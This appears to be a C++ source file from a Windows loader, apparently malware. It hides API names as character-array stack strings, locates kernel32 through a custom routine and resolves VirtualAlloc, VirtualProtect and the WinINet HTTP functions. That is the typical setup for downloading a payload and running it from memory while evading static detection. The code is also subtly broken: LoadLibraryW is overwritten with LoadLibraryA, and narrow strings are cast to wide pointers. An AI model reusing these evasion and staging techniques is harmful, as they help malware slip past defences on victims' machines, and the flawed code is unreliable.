#include "Init.h"

FARPROC getProcAddress(HMODULE hModuleBase);
extern "C" PVOID64 getKernel32();

Init* Init::myInit = nullptr;

Init* Init::GetInstance()
{
	if (myInit == nullptr)
	{
		myInit = new Init();
	}
    return myInit;
}

void Init::FindFuncionAddr()
{
	char xyLoadLibraryW[] = { 'L','o','a','d','L','i','b','r','a','r','y','W',0 };
	char xyLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	char xy_Virtualalloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 };
	char xy_VirtualProtectC[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0 };
	char xy_VirtualallocEx[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };

	char xy_Wininet[] = { 'W','i','n','i','n','e','t','.','d','l','l',0 };
	char xy_InternetOpenA[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A',0 };
	char xy_HttpSendRequestW[] = { 'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','W',0 };
	char xy_InternetQueryOptionW[] = { 'I','n','t','e','r','n','e','t','Q','u','e','r','y','O','p','t','i','o','n','W',0 };
	char InternetSetOptionW[] = { 'I','n','t','e','r','n','e','t','S','e','t','O','p','t','i','o','n','W',0 };
	char xy_InternetReadFile[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0 };
	char xy_InternetConnectA[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A',0 };
	char xy_HttpOpenRequestA[] = { 'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A',0 };
	char xy_InternetCloseHandle[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0 };

	Init::fn_GetProcAddress = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());
	Init::fn_LoadLibraryW = (FN_LoadLibraryW)fn_GetProcAddress((HMODULE)getKernel32(), xyLoadLibraryW);
	Init::fn_LoadLibraryW = (FN_LoadLibraryW)fn_GetProcAddress((HMODULE)getKernel32(), xyLoadLibraryA);
	Init::fn_VirtualAlloc = (FM_VirtualAlloc)fn_GetProcAddress((HMODULE)getKernel32(), xy_Virtualalloc);
	Init::fn_VirtualProtect = (FM_VirtualProtect)fn_GetProcAddress((HMODULE)getKernel32(), xy_VirtualProtectC);

	Init::fn_InternetOpenA = (Fn_InternetOpenA)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_InternetOpenA);
	Init::fn_HttpSendRequestW = (Fn_HttpSendRequestW)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_HttpSendRequestW);
	Init::fn_InternetQueryOptionW = (Fn_InternetQueryOptionW)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_InternetQueryOptionW);
	Init::fn_InternetSetOptionW = (Fn_InternetSetOptionW)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), InternetSetOptionW);
	Init::fn_InternetReadFile = (Fn_InternetReadFile)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_InternetReadFile);
	Init::fn_InternetConnectA = (Fn_InternetConnectA)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_InternetConnectA);
	Init::fn_HttpOpenRequestA = (Fn_HttpOpenRequestA)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_HttpOpenRequestA);
	Init::fn_InternetCloseHandle = (Fn_InternetCloseHandle)fn_GetProcAddress(fn_LoadLibraryW((LPCWSTR)xy_Wininet), xy_InternetCloseHandle);

}
